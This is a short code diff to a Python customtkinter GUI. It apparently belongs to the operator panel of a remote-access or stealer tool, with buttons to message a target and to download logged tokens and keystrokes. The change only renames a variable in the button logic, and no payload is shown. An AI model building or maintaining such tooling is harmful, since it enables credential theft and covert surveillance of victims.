@@ -150,7 +150,7 @@ class Controller(customtkinter.CTkFrame):
                         text_color="white"
                     )
 
-                elif command == "Show Message Box":
+                elif button_name == "Show Message Box":
                     btn = customtkinter.CTkButton(
                         frame, text=button_name, 
                         command=lambda: self.get_message_box(target), 
@@ -158,7 +158,7 @@ class Controller(customtkinter.CTkFrame):
                         text_color="white"
                     )
 
-                elif command == "Logged Tokens":
+                elif button_name == "Logged Tokens":
                     btn = customtkinter.CTkButton(
                         frame, text=button_name, 
                         command=self.download_tokens, 
@@ -166,7 +166,7 @@ class Controller(customtkinter.CTkFrame):
                         text_color="white"
                     )
 
-                elif command == "Logged Keystrokes":
+                elif button_name == "Logged Keystrokes":
                     btn = customtkinter.CTkButton(
                         frame, text=button_name, 
                         command=self.download_keylogs, 
